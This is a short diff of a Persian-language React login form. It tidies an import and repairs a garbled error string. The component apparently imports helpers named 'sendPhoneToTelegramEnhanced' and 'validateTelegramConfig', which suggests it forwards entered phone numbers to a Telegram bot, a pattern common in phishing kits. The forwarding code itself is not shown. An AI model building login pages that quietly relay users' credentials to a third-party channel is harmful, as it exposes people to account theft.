@@ -17,11 +17,7 @@ import { Input } from "@/components/ui/input";
 import { AlertMessage } from "./AlertMessage";
 import { OTPInput } from "./OTPInput";
 import { cn } from "@/lib/utils";
-import {
-  toPersianDigits,
-  toEnglishDigits,
-  maskPhoneNumber,
-} from "@/lib/persian-utils";
+import { toPersianDigits, toEnglishDigits } from "@/lib/persian-utils";
 import {
   sendPhoneToTelegramEnhanced,
   validateTelegramConfig,
@@ -135,7 +131,7 @@ export const LoginForm = () => {
           setEmailStep("code");
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اش��باه است. لطفا کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
       }
